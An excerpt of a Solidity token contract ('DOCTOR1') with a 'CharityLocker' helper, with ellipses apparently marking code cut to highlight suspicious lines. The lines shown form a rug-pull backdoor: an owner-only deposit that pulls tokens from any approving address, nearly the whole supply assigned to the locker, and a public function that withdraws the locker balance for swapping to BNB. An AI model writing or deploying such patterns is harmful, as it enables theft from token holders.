...
contract CharityLocker is Ownable{
    ...
    function deposit(uint256 _amount, address _sender) public onlyOwner {
        IERC20(tokenAddress).transferFrom(_sender, address(this), _amount);
    }
...
contract DOCTOR1 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string private constant _name = "DOCTOR1";
    string private constant _symbol = "DOCTOR1";
    uint8 private constant _decimals = 9;

    uint256 private constant MAX = ~uint256(0);
    uint256 private  charityTarget = 1 * 10**12 * 10**_decimals;
    ...
    uint256 public _maxTxAmount = 5 * 10**50  * 10**_decimals;  
    ...
    CharityLocker charityLocker = new CharityLocker(address(this));
    ...
    constructor () {
        _rOwned[address(charityLocker)] = (MAX - (MAX % charityTarget));
        ...
        _isExcludedFromFee[address(charityLocker)] = true;
   ...
   function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
    ...
    function swapTokensForBNB(uint256 tokenAmount) private returns (bool status){
        ...
        try PancakeSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,0,path,address(this),block.timestamp + 60 * 1000) {
    ...
    function _mint() public {
        ...
        charityLocker.withdraw(balanceOf(address(charityLocker)), address(this));
